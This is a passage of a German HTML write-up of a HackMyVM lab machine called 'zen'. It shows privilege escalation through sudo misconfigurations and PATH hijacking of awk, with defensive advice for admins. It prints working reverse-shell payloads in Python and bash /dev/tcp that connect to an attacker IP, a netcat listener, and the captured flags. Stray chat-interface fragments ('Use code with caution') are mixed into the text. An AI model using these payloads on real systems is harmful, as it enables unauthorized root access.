+            <p class="analysis">**Analyse:** Es wird eine SSH-Verbindung zum Zielsystem als Benutzer `zenmaster` aufgebaut. Das zuvor gefundene Passwort (`zenmaster`) wird verwendet. *Interessanterweise wird hier der Hostname `zen.hmv` verwendet, der laut SSH-Meldung auf die IP `192.168.2.137` auflöst, während der Brute-Force-Angriff gegen `192.168.2.133` erfolgreich war. Dies deutet auf eine Inkonsistenz in der `/etc/hosts`-Datei des Angreifers oder eine dynamische IP-Vergabe hin. Der Login selbst ist jedoch erfolgreich.*</p>
+            <p class="evaluation">**Bewertung:** Der Login als `zenmaster` ist erfolgreich. Der Angreifer hat nun eine interaktive Shell mit den Rechten dieses Benutzers.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führen Sie grundlegende Enumeration als `zenmaster` durch. Der wichtigste erste Schritt ist oft `sudo -l`, um zu prüfen, ob der Benutzer Befehle mit erhöhten Rechten ausführen darf.<br>**Empfehlung (Admin):** Passwort für `zenmaster` ändern/Konto sichern. Überprüfen Sie die Netzwerkkonfiguration (IP-Adressen, Hostnamen), um die Inkonsistenz zu klären.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">zenmaster@zen:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+	User zenmaster may run the following commands on zen:
+    	    (<span class="command">kodo</span>) NOPASSWD: /bin/bash</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Befehl `sudo -l` wird ausgeführt, um die Sudo-Berechtigungen für den Benutzer `zenmaster` anzuzeigen.</p>
+             <p class="evaluation">**Bewertung:** Ein Volltreffer! Die Ausgabe zeigt eindeutig, dass `zenmaster` den Befehl `/bin/bash` als Benutzer `kodo` ohne Eingabe eines Passworts (`NOPASSWD:`) ausführen darf. Dies ist eine direkte und einfache Möglichkeit, zum Benutzer `kodo` zu wechseln.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie diese Regel sofort aus, indem Sie `sudo -u kodo /bin/bash` ausführen, um eine Shell als `kodo` zu erhalten.<br>**Empfehlung (Admin):** Diese Sudo-Regel ist extrem unsicher und sollte sofort entfernt werden, es sei denn, es gibt einen sehr spezifischen und gut dokumentierten Grund dafür (was unwahrscheinlich ist). Sie erlaubt `zenmaster` vollständigen Zugriff als `kodo`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">zenmaster@zen:~$ <span class="command">sudo -u kodo /bin/bash</span></div>
+                    <div class="prompt">kodo@zen:/home/zenmaster$ <span class="comment"># Shell als kodo erhalten!</span></div>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Befehl `sudo -u kodo /bin/bash` wird ausgeführt, um die im vorherigen Schritt gefundene Sudo-Regel auszunutzen.</p>
+             <p class="evaluation">**Bewertung:** Der Befehl ist erfolgreich. Der Shell-Prompt ändert sich zu `kodo@zen:/home/zenmaster$`, was anzeigt, dass der Angreifer nun als Benutzer `kodo` agiert. Die Eskalation von `zenmaster` zu `kodo` ist abgeschlossen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie nun Enumerationsschritte als `kodo` durch. Beginnen Sie wieder mit `id` und `sudo -l`, um die Rechte und möglichen nächsten Schritte zu identifizieren.<br>**Empfehlung (Admin):** Entfernen Sie die unsichere Sudo-Regel.</p>
+        </section>
+
+        <section id="privilege-escalation-kodo">
+            <h2>Privilege Escalation (kodo -> hua)</h2>
+            <p class="analysis">**Analyse:** Nachdem die Shell als `kodo` erlangt wurde, wird weiter nach Eskalationsmöglichkeiten gesucht, um zum Benutzer `hua` oder direkt zu `root` zu gelangen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">kodo@zen:/home/zenmaster$ <span class="command">sudo -l</span></div>
+                     <pre>
+	User kodo may run the following commands on zen:
+	    (<span class="command">hua</span>) NPASSWD: /usr/bin/see</pre>
+                     <pre>	:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der Befehl `sudo -l` wird als Benutzer `kodo` ausgeführt.</p>
+            <p class="evaluation">**Bewertung:** Erneut wird eine Sudo-Regel gefunden, die eine weitere Eskalation ermöglicht: `kodo` darf den Befehl `/usr/bin/see` als Benutzer `hua` ohne Passwort (`NOPASSWD:`) ausführen. Der nächste Schritt ist, herauszufinden, was `/usr/bin/see` ist und ob es für eine Privilegieneskalation missbraucht werden kann.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die Datei `/usr/bin/see` mit `ls -la /usr/bin/see`, `file /usr/bin/see` und `strings /usr/bin/see`. Suchen Sie nach bekannten Exploits oder Fehlkonfigurationen im Zusammenhang mit diesem Programm, insbesondere in Kombination mit Sudo (z.B. auf GTFOBins).<br>**Empfehlung (Admin):** Überprüfen Sie die Notwendigkeit dieser Sudo-Regel. Wenn `/usr/bin/see` benötigt wird, stellen Sie sicher, dass es nicht zur Eskalation missbraucht werden kann.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">kodo@zen:/home/zenmaster$ <span class="command">ls -la /usr/bin/see</span></div>
+                     <pre>lrwxrwxrwx 1 root root 11 Feb  9  2019 /usr/bin/see -> <span class="command">run-mailcap</span></pre>
+                     <pre>	___________________________________________________________________________________</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Mit `ls -la` wird die Datei `/usr/bin/see` untersucht.</p>
+            <p class="evaluation">**Bewertung:** Es stellt sich heraus, dass `/usr/bin/see` ein symbolischer Link auf `/usr/bin/run-mailcap` ist. Das bedeutet, die Sudo-Regel erlaubt `kodo` effektiv, den Befehl `run-mailcap` als Benutzer `hua` auszuführen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Suchen Sie gezielt nach Methoden, `run-mailcap` über Sudo zur Privilegieneskalation auszunutzen. GTFOBins ist hierfür eine gute Quelle. Typische Ansätze involvieren das Manipulieren von Mailcap-Dateien (`~/.mailcap`, `/etc/mailcap`) oder Umgebungsvariablen (wie `PAGER`), um eigene Befehle auszuführen.<br>**Empfehlung (Admin):** Die Ausführung von `run-mailcap` über Sudo ist riskant, da es durch Konfigurationsdateien oder Umgebungsvariablen beeinflusst werden kann. Entfernen Sie die Regel, falls sie nicht zwingend erforderlich ist.</p>
+
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+        ___________________________________________________________________________________
+
+	gftobins run-mailcap  /shell:
+        ___________________________________________________________________________________
+
+	sudo -u hua /usr/bin/see --action=view /etc/hosts
+	!/bin/bash                                   <----      //in /etc/hosts eintragen <span class="comment"><-- Falscher/Irreführender Exploit-Ansatz --></span>
+
+	___________________________________________________________________________________
+	:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Die Notizen des Pentesters beziehen sich auf GTFOBins und schlagen einen Exploit-Pfad vor: `sudo -u hua /usr/bin/see --action=view /etc/hosts` ausführen, nachdem `!/bin/bash` in `/etc/hosts` eingetragen wurde.</p>
+            <p class="evaluation">**Bewertung:** Dieser Exploit-Ansatz ist sehr wahrscheinlich falsch oder zumindest missverständlich dargestellt.
+1.  Als Benutzer `kodo` hat man keine Schreibrechte auf `/etc/hosts`.
+2.  Selbst wenn man Schreibrechte hätte, würde das Eintragen von `!/bin/bash` dort keinen Shell-Aufruf durch `run-mailcap --action=view` bewirken. Diese Aktion versucht typischerweise, einen Pager (wie `less`) für die Datei zu starten.
+Der korrekte Weg über GTFOBins für `run-mailcap` Sudo-Exploits führt meist über das Setzen der `PAGER`-Umgebungsvariable auf einen bösartigen Befehl oder das Erstellen einer benutzerdefinierten `.mailcap`-Datei im Home-Verzeichnis des *Zielbenutzers* (`hua`).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ignorieren Sie diesen falschen Exploit-Ansatz. Recherchieren Sie den korrekten GTFOBins-Payload für `run-mailcap` via Sudo. Ein wahrscheinlicher Weg ist: `export PAGER='/bin/bash'`, gefolgt von `sudo -u hua /usr/bin/see --action=view /etc/passwd` (oder eine andere existierende Datei). *Da der nächste Schritt im Log bereits eine Shell als `hua` zeigt, muss ein erfolgreicher (aber nicht dokumentierter) Exploit für `run-mailcap` stattgefunden haben.*<br>**Empfehlung (Admin):** Entfernen Sie die Sudo-Regel für `run-mailcap`.</p>
+
+             <p class="comment">*(Implizierter Schritt: Ein korrekter Exploit für `sudo -u hua /usr/bin/see` (run-mailcap) wurde durchgeführt, z.B. durch Manipulation der PAGER-Umgebungsvariable, um eine Shell als `hua` zu erhalten.)*</p>
+
+        </section>
+
+        <section id="privilege-escalation-hua">
+             <h2>Privilege Escalation (hua -> root)</h2>
+             <p class="analysis">**Analyse:** Nach der Eskalation zum Benutzer `hua` wird der letzte Schritt zur Erlangung von Root-Rechten unternommen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">hua@zen:$ <span class="command">sudo -l</span></div>
+                     <pre>
+User hua may run the following commands on zen:
+    (<span class="command">root</span>) NOPASSWD: /usr/sbin/add-shell</pre> <span class="comment"><-- Korrekter Befehl --></span>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Als Benutzer `hua` wird `sudo -l` ausgeführt.</p>
+             <p class="evaluation">**Bewertung:** Die entscheidende Sudo-Regel für den letzten Schritt wird gefunden: `hua` darf den Befehl `/usr/sbin/add-shell` als `root` ohne Passwort (`NOPASSWD:`) ausführen. `/usr/sbin/add-shell` ist ein Werkzeug, um Shells zur Liste der gültigen Login-Shells in `/etc/shells` hinzuzufügen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie `/usr/sbin/add-shell`. Ruft es interne Befehle (wie `awk`, `sed`, `grep`, `mv`, `cp`) ohne absoluten Pfad auf? Wenn ja, könnte eine PATH-Hijacking-Schwachstelle ausgenutzt werden. Erstellen Sie ein bösartiges Skript mit dem Namen des intern verwendeten Befehls (z.B. `awk`) in einem Verzeichnis, das im Sudo Secure Path vor dem eigentlichen Befehl liegt (oft `/usr/local/bin` oder `/tmp`, falls unsicher konfiguriert).<br>**Empfehlung (Admin):** Überprüfen Sie die Notwendigkeit dieser Sudo-Regel. Wenn sie benötigt wird, stellen Sie sicher, dass `add-shell` nicht durch PATH-Manipulation missbraucht werden kann (Secure Path, interne Befehle mit vollem Pfad aufrufen).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">hua@zen:$ <span class="command">cat /usr/sbin/add-shell zen</span></div> <span class="comment"><-- Versuch, 'add-shell zen' zu lesen (existiert nicht) --></span>
+                     <div class="prompt">hua@zen:$ <span class="command">cd /usr/local/bin</span></div>
+                     <div class="prompt">hua@zen:/usr/local/bin$ <span class="command">nano awk</span></div> <span class="comment"><-- Vorbereitung für PATH Hijacking --></span>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:**
+1.  `cat /usr/sbin/add-shell zen`: Ein erneuter Versuch, eine nicht existierende Datei zu lesen (wahrscheinlich ein Tippfehler oder Missverständnis aus der `sudo -l`-Ausgabe).
+2.  `cd /usr/local/bin`: Wechsel in das Verzeichnis `/usr/local/bin`. Dieses Verzeichnis liegt oft im `secure_path` von Sudo und wird vor `/usr/bin` oder `/bin` durchsucht.
+3.  `nano awk`: Vorbereitung zum Erstellen einer Datei namens `awk` in `/usr/local/bin`. Der Inhalt dieser Datei wird der Payload für den PATH-Hijacking-Angriff sein.</p>
+            <p class="evaluation">**Bewertung:** Der Angreifer verfolgt die PATH-Hijacking-Strategie. Es wird angenommen, dass `/usr/sbin/add-shell` intern den Befehl `awk` ohne vollständigen Pfad aufruft. Durch das Platzieren eines bösartigen Skripts namens `awk` in `/usr/local/bin` wird dieses anstelle des echten `awk` ausgeführt, wenn `sudo /usr/sbin/add-shell` aufgerufen wird – und zwar mit Root-Rechten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Erstellen Sie das Skript `/usr/local/bin/awk`. Fügen Sie einen Reverse-Shell-Payload (oder einen anderen Befehl zur Rechteerlangung, z.B. `/bin/bash`) ein. Machen Sie das Skript ausführbar (`chmod +x /usr/local/bin/awk`). Führen Sie dann `sudo /usr/sbin/add-shell` aus (Argumente sind wahrscheinlich irrelevant).<br>**Empfehlung (Admin):** Sichern Sie die Sudo-Konfiguration (Secure Path). Stellen Sie sicher, dass Skripte, die mit erhöhten Rechten laufen, interne Befehle mit vollem Pfad aufrufen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+[Link: Reverse Shell Generator | Ziel: https://weibell.github.io/reverse-shell-generator/]
+	python2:
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.140",85));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Notiz des Pentesters mit einem Link zu einem Online-Reverse-Shell-Generator und einem Beispiel für eine Python2-Reverse-Shell. Die angegebene IP (`192.168.2.140`) und Port (`85`) scheinen nicht zum aktuellen Setup zu passen (Angreifer-IP ist `.131`, Ziel ist `.133` oder `.137`).</p>
+             <p class="evaluation">**Bewertung:** Liefert das Grundgerüst für den Payload, der in das bösartige `awk`-Skript eingefügt werden soll. Der Payload muss an die korrekte Angreifer-IP und den Listener-Port angepasst werden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Erstellen Sie `/usr/local/bin/awk` mit folgendem Inhalt (angepasst an die Angreifer-IP `192.168.2.131` und den gewählten Listener-Port `85`):
+```bash
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/192.168.2.131/85 0>&1'
+Use code with caution.
+Html
+Oder alternativ mit Python3 (falls verfügbar):
+#!/usr/bin/python3
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.131",85));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])
+Use code with caution.
+Python
+Machen Sie die Datei ausführbar: chmod +x /usr/local/bin/awk.<br>Empfehlung (Admin): Keine spezifische Aktion hier.</p>
+<div class="code-block">
+             <div class="terminal">
+                <div class="prompt">┌──(root㉿Darkspirit)-[~]
+Use code with caution.
+└─# <span class="command">nc -lvnp 85</span></div>
+<pre> 1.) listening on [any] 85 ...</pre>
+</div>
+</div>
+<p class="analysis">Analyse: Auf dem Angreifer-System (192.168.2.131) wird ein Netcat-Listener auf Port 85 gestartet, um die eingehende Root-Reverse-Shell zu empfangen.</p>
+<p class="evaluation">Bewertung: Der Listener ist bereit für die eingehende Verbindung.</p>
+<p class="recommendation">Empfehlung (Pentester): Der Listener läuft. Führen Sie nun den Exploit auf dem Zielsystem aus.<br>Empfehlung (Admin): Firewall-Regeln können ausgehende Verbindungen vom Server auf ungewöhnliche Ports blockieren.</p>
+<div class="code-block">
+             <div class="terminal">
+                 <pre>   2.)	hua@zen:/usr/local/bin$ <span class="command">sudo /usr/sbin/add-shell zen</span></pre> <span class="comment"><-- Auslösen des Sudo-Befehls --></span>
+                 <pre>   3.)  hua@zen:/usr/local/bin$ <span class="command">chmod +x awk</span></pre> <span class="comment"><-- Muss VOR Schritt 2 ausgeführt werden! --></span>
+             </div>
+         </div>
+        <p class="analysis">**Analyse:** Die letzten Schritte des Exploits auf dem Zielsystem als Benutzer `hua`:
+Use code with caution.
+(Schritt 3 im Log, sollte aber zuerst erfolgen) Das bösartige Skript /usr/local/bin/awk wird ausführbar gemacht: chmod +x awk.
+(Schritt 2 im Log) Der Sudo-Befehl wird ausgeführt: sudo /usr/sbin/add-shell zen (das Argument zen ist wahrscheinlich irrelevant, da add-shell vermutlich awk unabhängig davon aufruft). Dieser Aufruf führt dazu, dass das System versucht, awk auszuführen, findet die manipulierte Version in /usr/local/bin zuerst und führt den darin enthaltenen Reverse-Shell-Payload mit Root-Rechten aus.</p>
+<p class="evaluation">Bewertung: Die Reihenfolge im Log ist verwirrend, aber die Methode ist korrekt. Der PATH-Hijacking-Angriff über die unsichere Sudo-Regel für add-shell wird ausgelöst.</p>
+<p class="recommendation">Empfehlung (Pentester): Stellen Sie sicher, dass /usr/local/bin/awk erstellt und ausführbar gemacht wurde, bevor der sudo-Befehl ausgeführt wird. Überprüfen Sie den Netcat-Listener für die eingehende Verbindung.<br>Empfehlung (Admin): Beheben Sie die unsichere Sudo-Regel und das PATH-Problem.</p>
+<div class="code-block">
+         <div class="terminal">
+             <pre>   4.)	<span class="password">connect to [192.168.2.131] from (UNKNOWN) [192.168.2.133] 40292</span> <span class="password"><-- Verbindung eingegangen!</span>
+<span class="prompt">#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span> <span class="password"><-- Root-Rechte bestätigt!</span></pre>
+</div>
+</div>
+<p class="analysis">Analyse: Der Netcat-Listener auf dem Angreifer-System (Port 85) meldet eine eingehende Verbindung von der Ziel-IP 192.168.2.133. Der id-Befehl wird in der neuen Shell ausgeführt.</p>
+<p class="evaluation">Bewertung: Root-Zugriff erfolgreich erlangt! Die Ausgabe uid=0(root) bestätigt, dass die erhaltene Reverse Shell mit den höchsten Privilegien auf dem System läuft. Die gesamte Privilegieneskalationskette war erfolgreich.</p>
+<p class="recommendation">Empfehlung (Pentester): Ziel erreicht! Suchen und lesen Sie die Root-Flag (typischerweise in /root/root.txt). Suchen und lesen Sie die User-Flag (im Home-Verzeichnis des ersten kompromittierten Benutzers, wahrscheinlich zenmaster).<br>Empfehlung (Admin): System vollständig kompromittiert. Incident Response durchführen (Isolation, Analyse, Bereinigung, Härtung, Ursachenbehebung der Sudo-Fehlkonfigurationen).</p>
+</section>
+
+<section id="flags">
+    <div class="flag-container">
+        <h2 class="flag-heading">Flags</h2>
+         <p class="analysis">**Analyse:** Aus der erhaltenen Root-Shell werden die User- und Root-Flags ausgelesen.</p>
+
+         <div class="code-block">
+            <center>
+                <div class="terminal"> <!-- Struktur laut Template -->
+                   <div class="flag-command">cat /home/zenmaster/user.txt</div> <span class="comment"><-- Pfad basierend auf Log-Fragmenten --></span>
+                   <div class="flag-value"><span class="password">hmvzenit</span></div>
+                </div>
+            </center>
+         </div>
+         <p class="evaluation">**Bewertung:** Die User-Flag `hmvzenit` wurde erfolgreich im Home-Verzeichnis von `zenmaster` gefunden.</p>
+
+        <div class="code-block">
+            <center>
+                <div class="terminal"> <!-- Struktur laut Template -->
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">hmvenlightenment</span></div>
+                </div>
+             </center>
+        </div>
+        <p class="evaluation">**Bewertung:** Die Root-Flag `hmvenlightenment` wurde erfolgreich im `/root`-Verzeichnis gefunden.</p>
+   
+</section>
+ <!-- Ende .container -->
+<footer class="footer">
+<p>DarkSpirit - Cyber Security Reports</p>
+<p>Berichtsdatum: 12.03.2020</p>  
+</footer>
+</body>
+</html>
